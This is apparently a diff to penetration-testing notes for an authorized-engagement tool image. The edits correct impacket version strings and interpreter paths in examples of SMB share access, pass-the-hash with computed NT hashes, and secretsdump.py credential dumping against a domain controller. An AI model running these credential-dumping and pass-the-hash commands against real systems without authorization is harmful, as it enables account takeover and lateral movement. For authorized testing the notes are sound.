@@ -9,8 +9,10 @@ verified failure mode or the documented output shape is shown.
 Conventions: `$TARGET` is an authorized host, `$WORK` is the per-engagement
 directory (`/working/engagements/<name>`), `$DC` is the domain controller.
 
-Versions in this image: impacket `0.14.0.dev0+20260916.40533.c38d1eeb`,
-NetExec `1.5.1+0.c7dc286b`. Scripts live in `/opt/venvs/impacket/bin`.
+Versions in this image: impacket `0.13.1` (the release in `/opt/venvs/impacket`;
+NetExec's venv resolves a separate unreleased revision of impacket — see
+`tools/netexec/EXAMPLES.md`), NetExec `1.5.1+0.c7dc286b`. Scripts live in
+`/opt/venvs/impacket/bin`.
 
 ---
 
@@ -31,7 +33,7 @@ Startup output is almost nothing — the banner, then silence until a client
 connects (add `-debug` for the protocol chatter):
 
 ```
-Impacket v0.14.0.dev0+20260916.40533.c38d1eeb - Copyright Fortra, LLC and its affiliated companies
+Impacket v0.13.1 - Copyright Fortra, LLC and its affiliated companies
 ```
 
 After a client enumerates the share, the same stdout shows:
@@ -55,7 +57,7 @@ CMDS
 ```
 
 ```
-Impacket v0.14.0.dev0+20260916.40533.c38d1eeb - Copyright Fortra, LLC and its affiliated companies
+Impacket v0.13.1 - Copyright Fortra, LLC and its affiliated companies
 
 Type help for list of commands
 # Share Name                Type            Comment
@@ -70,11 +72,8 @@ drw-rw-rw-       4096  Thu Sep 17 20:45:38 2026 sub
 # Bye!
 ```
 
-`get`/`put` take one argument. `get share-file.txt /tmp/out` fails:
-
-```
-[-] [Errno 2] No such file or directory: 'share-file.txt /tmp/out'
-```
+`get`/`put` take one argument. `get share-file.txt /tmp/out` fails: the whole
+string is taken as the remote filename, which does not exist.
 
 The server-side log records SMB operations when `-outputfile` is used:
 
@@ -84,10 +83,11 @@ The server-side log records SMB operations when `-outputfile` is used:
 
 ## 2. Pass-the-hash against the lab share (`-hashes`)
 
-Compute the NT hash with impacket — `hashlib.new('md4')` fails in this image:
+Compute the NT hash with impacket — `hashlib.new('md4')` fails in this image,
+and bare `python3` (`/opt/py/bin/python3`) cannot import impacket:
 
 ```bash
-NT=$(python3 -c "from impacket.ntlm import compute_nthash; print(compute_nthash('smbpass').hex())")
+NT=$(/opt/venvs/impacket/bin/python3 -c "from impacket.ntlm import compute_nthash; print(compute_nthash('smbpass').hex())")
 echo "$NT"          # d75431eb358edcabbf20e45787c3fb5f
 
 smbclient.py -hashes ":$NT" smbuser@127.0.0.1 <<'CMDS'
@@ -130,7 +130,7 @@ secretsdump.py 'CORP/alice:Passw0rd!@10.0.0.20' \
 Expected shape (not observed here):
 
 ```
-Impacket v0.14.0.dev0+20260916.40533.c38d1eeb - Copyright Fortra, LLC and its affiliated companies
+Impacket v0.13.1 - Copyright Fortra, LLC and its affiliated companies
 
 [*] Target system bootKey: 0x…
 [*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
@@ -317,11 +317,12 @@ tracebacks in `impacket/examples/ntlmrelayx/servers/smbrelayserver.py`
 ## 9. Useful one-liners
 
 ```bash
-# which impacket version is actually installed
-python3 -c "from impacket import version; print(version.BANNER)"
+# which impacket version is actually installed (use the venv interpreter —
+# bare `python3` is /opt/py/bin/python3 and cannot import impacket)
+/opt/venvs/impacket/bin/python3 -c "from impacket import version; print(version.BANNER)"
 
 # NT hash for a known password (for -hashes testing)
-python3 -c "from impacket.ntlm import compute_nthash; print(compute_nthash('Password1').hex())"
+/opt/venvs/impacket/bin/python3 -c "from impacket.ntlm import compute_nthash; print(compute_nthash('Password1').hex())"
 
 # every impacket script available
 ls /opt/venvs/impacket/bin | grep -E '\.py$' | sort
